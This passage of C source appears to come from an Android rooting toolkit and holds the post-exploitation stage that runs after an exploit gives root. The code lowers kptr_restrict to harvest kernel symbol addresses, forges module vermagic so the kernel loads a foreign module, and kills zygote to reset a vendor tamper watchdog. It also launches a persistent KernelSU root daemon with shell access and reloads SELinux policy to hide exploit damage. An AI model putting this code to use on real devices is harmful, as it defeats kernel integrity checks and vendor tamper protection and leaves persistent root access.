  *lenp = append_off + new_len;
  return 0;
}

/* ksuinit::load_module: relocate UNDEF syms from kallsyms then
 * init_module(); on failure read the required vermagic from /dev/kmsg,
 * rewrite .modinfo and retry. */
int magica_load_module(const char *path, const char *params) {
  unsigned char *buf = NULL;
  size_t len = 0;
  if (magica_read_file(path, &buf, &len) != 0) {
    pr_error("magica: cannot read module %s\n", path);
    return 0;
  }

  if (len < sizeof(Elf64_Ehdr)) {
    free(buf);
    return 0;
  }
  Elf64_Ehdr *eh = (Elf64_Ehdr *)buf;
  if (memcmp(eh->e_ident, ELFMAG, SELFMAG) != 0 || eh->e_ident[EI_CLASS] != ELFCLASS64) {
    pr_error("magica: not an ELF64 module: %s\n", path);
    free(buf);
    return 0;
  }
  int le = eh->e_ident[EI_DATA] == ELFDATA2LSB;
  size_t shoff = (size_t)eh->e_shoff;
  size_t shentsz = (size_t)eh->e_shentsize;
  size_t shnum = (size_t)eh->e_shnum;
  size_t shstrndx = (size_t)eh->e_shstrndx;

  /* locate .symtab and its string table */
  size_t sym_off = 0, sym_size = 0, sym_entsize = 0;
  size_t str_off = 0, str_size = 0;
  if (shnum > 0 && shoff + shnum * shentsz <= len) {
    /* first find section header string table */
    size_t shstr_off = 0, shstr_size = 0;
    if (shstrndx < shnum) {
      const unsigned char *sh =
          buf + shoff + shstrndx * shentsz;
      shstr_off = (size_t)magica_elf_word(sh + 0x18, le);
      shstr_size = (size_t)magica_elf_word(sh + 0x20, le);
    }
    for (size_t i = 0; i < shnum; i++) {
      const unsigned char *sh = buf + shoff + i * shentsz;
      uint32_t name_off = (uint32_t)magica_elf_word(sh, le);
      size_t sh_off = (size_t)magica_elf_word(sh + 0x18, le);
      size_t sh_sz = (size_t)magica_elf_word(sh + 0x20, le);
      size_t sh_es = (size_t)magica_elf_word(sh + 0x38, le);
      if (name_off >= shstr_size) {
        continue;
      }
      const char *name = (const char *)(buf + shstr_off + name_off);
      if (strcmp(name, ".symtab") == 0) {
        sym_off = sh_off;
        sym_size = sh_sz;
        sym_entsize = sh_es ? sh_es : sizeof(Elf64_Sym);
      } else if (strcmp(name, ".strtab") == 0) {
        str_off = sh_off;
        str_size = sh_sz;
      } else if (strcmp(name, ".modinfo") == 0) {
        /* saved for vermagic patch; offsets captured later if needed */
      }
    }
  }

  if (!sym_off || sym_size < sizeof(Elf64_Sym)) {
    pr_warning("magica: no .symtab in %s (size=%zu)\n", path, sym_size);
  }

  /* lower kptr_restrict so kallsyms shows real addresses (root needed);
   * every exit path below must magica_kptr_restrict_restore(saved_kptr)
   * — run114 left it at 1 until reboot (tamper surface). */
  int saved_kptr = magica_kptr_restrict_lower();
  pr_info("magica: loading kallsyms cache...\n");
  fsync(STDERR_FILENO);
  if (magica_kallsyms_cache_load() != 0) {
    pr_warning("magica: kallsyms cache load failed\n");
    fsync(STDERR_FILENO);
    free(buf);
    magica_kptr_restrict_restore(saved_kptr);
    return 0;
  }
  pr_info("magica: kallsyms cache loaded %zu bytes; resolving...\n",
          g_kallsyms_cache_len);
  fsync(STDERR_FILENO);

  /* resolve undefined symbols. AUDIT BUG-3: the old loop called extend()
   * once per missing symbol (N extends + full reindex after each, and a
   * "cache full" warning per symbol once at MAX). Two passes instead:
   * resolve what the 2MB cache has, collect the misses, then extend in a
   * controlled loop and retry only the missing set. */
  int resolved = 0, unresolved = 0;
  size_t missing_offs[768];
  size_t missing_cnt = 0;
  for (size_t off = 0; sym_off && off + sizeof(Elf64_Sym) <= sym_size;
       off += sym_entsize) {
    const unsigned char *s = buf + sym_off + off;
    uint32_t st_name = (uint32_t)magica_elf_word(s, le);
    uint16_t st_shndx = (uint16_t)magica_elf_word(s + 6, le);
    if (st_shndx != SHN_UNDEF || st_name == 0) {
      continue;
    }
    if (st_name >= str_size) {
      continue;
    }
    const char *name = (const char *)(buf + str_off + st_name);
    uint64_t addr = 0;
    if (magica_kallsyms_lookup(name, &addr) == 0 && addr != 0) {
      buf[sym_off + off + 6] = (unsigned char)(SHN_ABS & 0xff);
      buf[sym_off + off + 7] = (unsigned char)((SHN_ABS >> 8) & 0xff);
      magica_elf_write_word(buf + sym_off + off + 8, addr, le);
      resolved++;
    } else if (missing_cnt < sizeof(missing_offs) / sizeof(missing_offs[0])) {
      missing_offs[missing_cnt++] = off;
    } else {
      unresolved++;
    }
  }

  /* extend the cache and retry the missing set until found / EOF / MAX */
  while (missing_cnt > 0) {
    pr_info("magica: %zu symbols beyond cache; extending...\n", missing_cnt);
    fsync(STDERR_FILENO);
    if (magica_kallsyms_cache_extend() != 0) {
      break; /* EOF, cache max, or read interrupted */
    }
    size_t remaining = 0;
    for (size_t i = 0; i < missing_cnt; i++) {
      size_t off = missing_offs[i];
      const unsigned char *s = buf + sym_off + off;
      uint32_t st_name = (uint32_t)magica_elf_word(s, le);
      const char *name = (const char *)(buf + str_off + st_name);
      uint64_t addr = 0;
      if (magica_kallsyms_lookup(name, &addr) == 0 && addr != 0) {
        buf[sym_off + off + 6] = (unsigned char)(SHN_ABS & 0xff);
        buf[sym_off + off + 7] = (unsigned char)((SHN_ABS >> 8) & 0xff);
        magica_elf_write_word(buf + sym_off + off + 8, addr, le);
        resolved++;
      } else {
        missing_offs[remaining++] = off;
      }
    }
    missing_cnt = remaining;
  }
  unresolved += (int)missing_cnt;
  if (missing_cnt > 0) {
    pr_warning("magica: %zu symbols unresolved after cache max\n",
               missing_cnt);
    fsync(STDERR_FILENO);
  }
  pr_info("magica: relocated %d/%d undefined symbols\n", resolved,
          resolved + unresolved);
  fsync(STDERR_FILENO);

  /* init_module */
  int ret = syscall(SYS_init_module, buf, len, params ? params : "");
  if (ret == 0) {
    pr_info("magica: init_module ok %s\n", path);
    fsync(STDERR_FILENO);
    free(buf);
    magica_kptr_restrict_restore(saved_kptr);
    magica_unlink_module(path);
    return 1;
  }
  int saved_errno = errno;
  pr_warning("magica: init_module failed errno=%d (%s); attempting vermagic "
             "repair\n",
             saved_errno, strerror(saved_errno));
  fsync(STDERR_FILENO);

  /* vermagic repair: read required magic from /dev/kmsg, rewrite .modinfo */
  {
    char kmsg[65536];
    char required[256];
    if (magica_kmsg_read(kmsg, sizeof(kmsg)) != 0 ||
        magica_extract_vermagic(kmsg, required, sizeof(required)) != 0) {
      pr_warning("magica: cannot extract required vermagic from kmsg\n");
      fsync(STDERR_FILENO);
      free(buf);
      magica_kptr_restrict_restore(saved_kptr);
      return 0;
    }
    pr_info("magica: kernel requires vermagic '%s'; replacing and retrying\n",
            required);
    fsync(STDERR_FILENO);
    if (magica_replace_vermagic(&buf, &len, required, le) != 0) {
      pr_warning("magica: vermagic replacement failed\n");
      fsync(STDERR_FILENO);
      free(buf);
      magica_kptr_restrict_restore(saved_kptr);
      return 0;
    }
    ret = syscall(SYS_init_module, buf, len, params ? params : "");
    if (ret == 0) {
      pr_info("magica: init_module ok after vermagic repair %s\n", path);
      fsync(STDERR_FILENO);
      free(buf);
      magica_kptr_restrict_restore(saved_kptr);
      magica_unlink_module(path);
      return 1;
    }
    pr_warning("magica: init_module still failed errno=%d (%s)\n", errno,
               strerror(errno));
    fsync(STDERR_FILENO);
  }

  free(buf);
  magica_kptr_restrict_restore(saved_kptr);
  return 0;
}

/* Android soft reboot: kill zygote ONLY (a.so restart_zygote_direct).
 * init respawns zygote → zygote respawns system_server; the old
 * system_server exits by itself (watchdog sees the dead zygote) and
 * persists its state cleanly. DO NOT kill system_server directly — a
 * SIGKILL'd system_server leaves packages.xml / permission caches
 * half-written, and every newly started app then crashes (observed:
 * all apps except already-running ones crash after our soft reboot).
 * The ColorOS tamper watchdog (under system_server/app zygote) dies with
 * the framework tree either way, resetting its 15s reboot timer.
 *
 * adbd, the exploit shell and the su daemon are NOT under zygote — they
 * survive, so the adb session and su stay usable.
 */
static int magica_kill_comm(const char *want) {
  int killed = 0;
  DIR *pd = opendir("/proc");
  if (!pd) {
    return 0;
  }
  struct dirent *pde;
  while ((pde = readdir(pd)) != NULL) {
    char *end = NULL;
    long pl = strtol(pde->d_name, &end, 10);
    if (pl <= 1 || end == NULL || *end != '\0') {
      continue;
    }
    char cp[64];
    /* a.so parity: match argv[0] basename from /proc/PID/cmdline —
     * zygote rewrites argv[0] to "zygote64". The old comm-based match
     * NEVER fired because fgets keeps the trailing '\n'
     * (strcmp("zygote64\n","zygote64") != 0) — run115 proved it: the
     * log said "soft reboot" but zygote STIME never changed, so the
     * ColorOS watchdog was never reset (run114 rebooted ~20min later). */
    snprintf(cp, sizeof(cp), "/proc/%ld/cmdline", pl);
    int cf = open(cp, O_RDONLY | O_CLOEXEC);
    char cmd[128];
    memset(cmd, 0, sizeof(cmd));
    ssize_t got = -1;
    if (cf >= 0) {
      got = read(cf, cmd, sizeof(cmd) - 1);
      close(cf);
    }
    const char *base = cmd;
    if (got > 0) {
      char *slash = strrchr(cmd, '/');
      if (slash) {
        base = slash + 1;
      }
    } else {
      /* fallback: comm with trailing whitespace stripped */
      snprintf(cp, sizeof(cp), "/proc/%ld/comm", pl);
      cf = open(cp, O_RDONLY | O_CLOEXEC);
      if (cf >= 0) {
        got = read(cf, cmd, sizeof(cmd) - 1);
        close(cf);
        if (got > 0) {
          while (got > 0 && (cmd[got - 1] == '\n' || cmd[got - 1] == '\r')) {
            cmd[--got] = '\0';
          }
        }
      }
      base = cmd;
    }
    if (got > 0 && strcmp(base, want) == 0) {
      if (kill((pid_t)pl, SIGKILL) == 0) {
        killed++;
      }
    }
  }
  closedir(pd);
  return killed;
}

int magica_soft_reboot(void) {
  pr_info("magica: soft reboot via zygote kill — reset ColorOS tamper "
          "watchdog\n");
  fsync(STDERR_FILENO);

  /* only zygote (a.so kills cmdline-matched zygote/zygote64; same set
   * here). system_server must exit on its own so its state persists —
   * killing it corrupts framework state and newly launched apps crash. */
  int killed = magica_kill_comm("zygote");
  killed += magica_kill_comm("zygote64");
  pr_info("magica: soft reboot killed %d zygote process(es)\n", killed);
  fsync(STDERR_FILENO);
  return killed > 0;
}

/* ── a.so parity: install_kernelsu (exec libksud.so "late-load") ───────
 *
 * Ghidra-decompiled from a.so (install_kernelsu @ 0x20a5c,
 * kernelsu_probe_loaded @ 0x20c9c, find_libksud_recursive @ 0x212cc).
 * a.so does NOT call init_module directly. It execs libksud.so in
 * "late-load" mode, which BOTH loads the kernel module AND runs the
 * persistent ksud daemon. The daemon survives the framework restart and
 * is what a.so relies on so the zygote kill does not hard reboot.
 *
 *   execl(path, "ksud", "late-load", "--package-name", pkg, "--allow-shell")
 */

/* kernelsu_probe_loaded(): KSU loaded if a "[ksu_driver]" fd exists in
 * /proc/self/fd, else the KSU-module-hooked syscall 142 (0x8e) with magic
 * 0xdeadbeef/0xcafebabe returns a driver fd; ioctl 0x80104b02 queries the
 * version. Returns 1 if the module is live. */
static int magica_ksu_probe_loaded(void) {
  int fd = -1;
  DIR *d = opendir("/proc/self/fd");
  if (d) {
    struct dirent *de;
    while ((de = readdir(d)) != NULL) {
      char *end = NULL;
      long n = strtol(de->d_name, &end, 10);
      if (!end || *end != '\0' || n < 0 || n >= 0x80000000L) {
        continue;
      }
      char link[64];
      snprintf(link, sizeof(link), "/proc/self/fd/%ld", n);
      char target[256];
      ssize_t rl = readlink(link, target, sizeof(target) - 1);
      if (rl < 0) {
        continue;
      }
      target[rl] = '\0';
      if (strstr(target, "[ksu_driver]") != NULL) {
        fd = (int)n;
        break;
      }
    }
    closedir(d);
  }
  if (fd < 0) {
    int out = -1;
    syscall(142, 0xdeadbeef, 0xcafebabe, 0, &out);
    fd = out;
  }
  if (fd < 0) {
    return 0;
  }
  uint64_t v = 0;
  if (ioctl(fd, 0x80104b02, &v) != 0) {
    ioctl(fd, 0x80004b02, &v);
  }
  return (int)v != 0;
}

/* find_libksud_recursive(): depth-limited recursive search under `dir`
 * for a regular file named "libksud.so" whose full path contains `pkg`.
 * Mirrors a.so's find_libksud_recursive("/data/app", pkg, 8, out). */
static int magica_find_libksud_recursive(const char *dir, const char *pkg,
                                         int depth, char *out) {
  if (depth <= 0) {
    return 0;
  }
  DIR *d = opendir(dir);
  if (!d) {
    return 0;
  }
  struct dirent *de;
  while ((de = readdir(d)) != NULL) {
    if (strcmp(de->d_name, ".") == 0 || strcmp(de->d_name, "..") == 0) {
      continue;
    }
    char path[512];
    snprintf(path, sizeof(path), "%s/%s", dir, de->d_name);
    struct stat st;
    if (lstat(path, &st) != 0) {
      continue;
    }
    if (S_ISDIR(st.st_mode)) {
      if (magica_find_libksud_recursive(path, pkg, depth - 1, out)) {
        closedir(d);
        return 1;
      }
    } else if (S_ISREG(st.st_mode) && strcmp(de->d_name, "libksud.so") == 0 &&
               (pkg == NULL || pkg[0] == '\0' || strstr(path, pkg) != NULL)) {
      snprintf(out, 512, "%s", path);
      closedir(d);
      return 1;
    }
  }
  closedir(d);
  return 0;
}

/* magica_install_kernelsu_aso(): a.so install_kernelsu parity. Execs
 * libksud.so in "late-load" mode (module load + persistent daemon).
 * libksud.so comes from KSU_LIBKSUD_PATH env or a KSU manager app under
 * /data/app. Returns 1 on success; *result gets -1 (init), 19 (ENODEV
 * timeout) or is left alone on success. */
int magica_install_kernelsu_aso(int *result) {
  if (result) {
    *result = -1;
  }
  if (magica_ksu_probe_loaded()) {
    pr_info("magica: KernelSU already loaded (a.so probe)\n");
    fsync(STDERR_FILENO);
    return 1;
  }
  const char *pkg = getenv("KSU_MANAGER_PACKAGE");
  if (!pkg || !pkg[0]) {
    pkg = "me.weishu.kernelsu";
  }
  char path[512];
  const char *libksud = getenv("KSU_LIBKSUD_PATH");
  if (libksud && libksud[0] && access(libksud, X_OK) == 0) {
    snprintf(path, sizeof(path), "%s", libksud);
  } else if (magica_find_libksud_recursive("/data/app", pkg, 8, path)) {
    /* found under /data/app */
  } else {
    pr_warning("magica: KernelSU official libksud.so not found pkg=%s\n",
               pkg);
    fsync(STDERR_FILENO);
    return 0;
  }
  pid_t pid = fork();
  int ok = 0;
  if (pid < 0) {
    ok = 0;
  } else if (pid == 0) {
    /* child: become root, then double-fork so the daemon is reparented
     * to init and survives the framework restart. Strip LD_PRELOAD so the
     * exec'd libksud.so does not re-run the exploit constructor. */
    unsetenv("LD_PRELOAD");
    if (setuid(0) != 0) {
      _exit(1);
    }
    pid_t gc = fork();
    if (gc < 0) {
      _exit(1);
    }
    if (gc != 0) {
      _exit(0); /* intermediate exits immediately */
    }
    execl(path, "ksud", "late-load", "--package-name", pkg, "--allow-shell",
          (char *)NULL);
    _exit(127);
  } else {
    int status = 0;
    while (waitpid(pid, &status, 0) < 0) {
      if (errno != EINTR) {
        break;
      }
    }
    ok = (status & 0xff7f) == 0;
  }
  pr_info("magica: KernelSU late-load exec libksud=%s pkg=%s ok=%d errno=%d\n",
          path, pkg, ok, errno);
  fsync(STDERR_FILENO);
  if (!ok) {
    return 0;
  }
  /* probe loop: 60 × 500ms = 30s (a.so parity) */
  for (int i = 0; i < 60; i++) {
    if (magica_ksu_probe_loaded()) {
      pr_info("magica: KernelSU active via late-load (libksud daemon)\n");
      fsync(STDERR_FILENO);
      return 1;
    }
    usleep(500000);
  }
  if (result) {
    *result = 19; /* ENODEV */
  }
  pr_warning("magica: late-load probe timeout (30s) — daemon did not start\n");
  fsync(STDERR_FILENO);
  return 0;
}

/* magica_load_policy(): reload the SELinux policy from the precompiled
 * blob (JoinChang ghostlock: "su -c load_policy (fix SELinux policycap)").
 * Called from the root child AFTER KSU late-load: the reload repairs any
 * selinux_state damage from the exploit and gives the restarted framework
 * a clean policy to spawn apps against (app-crash fix). KSU's kernel
 * module hooks the LSM layer directly, so the su domain survives the
 * reload. Returns 1 on success. */
int magica_load_policy(void) {
  const char *paths[] = {
      "/vendor/etc/selinux/precompiled_sepolicy",
      "/system/etc/selinux/precompiled_sepolicy",
      "/system_ext/etc/selinux/precompiled_sepolicy",
      "/sys/fs/selinux/policy",
      NULL,
  };
  int lfd = open("/sys/fs/selinux/load", O_WRONLY | O_CLOEXEC);
  if (lfd < 0) {
    pr_warning("magica: /sys/fs/selinux/load open failed errno=%d\n", errno);
    fsync(STDERR_FILENO);
    return 0;
  }
  int loaded = 0;
  for (int i = 0; paths[i] && !loaded; i++) {
    int pfd = open(paths[i], O_RDONLY | O_CLOEXEC);
    if (pfd < 0) {
      continue;
    }
    size_t cap = 8u << 20;
    char *blob = malloc(cap);
    if (!blob) {
      close(pfd);
      break;
    }
    size_t total = 0;
    ssize_t n;
    int truncated = 0;
    while ((n = read(pfd, blob + total, cap - total)) > 0) {
      total += (size_t)n;
      if (total >= cap) {
        truncated = 1;
        break;
      }
    }
    close(pfd);
    if (total > 0 && !truncated) {
      ssize_t wn = write(lfd, blob, total);
      if (wn == (ssize_t)total) {
        loaded = 1;
        pr_info("magica: load_policy OK from %s (%zu bytes)\n", paths[i],
                   total);
        fsync(STDERR_FILENO);
      } else {
        pr_warning("magica: load_policy write failed errno=%d from %s\n",
                   errno, paths[i]);
        fsync(STDERR_FILENO);
      }
    }
    free(blob);
  }
  close(lfd);
  return loaded;
}

/* wrapper honoring env: GHOSTLOCK_MAGICA_MODULE=<path>; default
 * /data/local/tmp/kernelsu.ko ; params from GHOSTLOCK_MAGICA_PARAMS */
int magica_try_load(void) {
  const char *mod = getenv("GHOSTLOCK_MAGICA_MODULE");
  if (!mod || !mod[0]) {
    mod = "/data/local/tmp/kernelsu.ko";
  }
  if (access(mod, R_OK) != 0) {
    pr_info("magica: module %s not present; skip load (place kernelsu.ko "
            "for this KMI to use Magica late-load)\n", mod);
    fsync(STDERR_FILENO);
    return 0;
  }
  const char *params = getenv("GHOSTLOCK_MAGICA_PARAMS");
  if (!params || !params[0]) {
    /* a.so's ksud late-load passes --allow-shell → module param
     * allow_shell=1. Align the default. */
    params = "allow_shell=1";
  }
  return magica_load_module(mod, params);
}
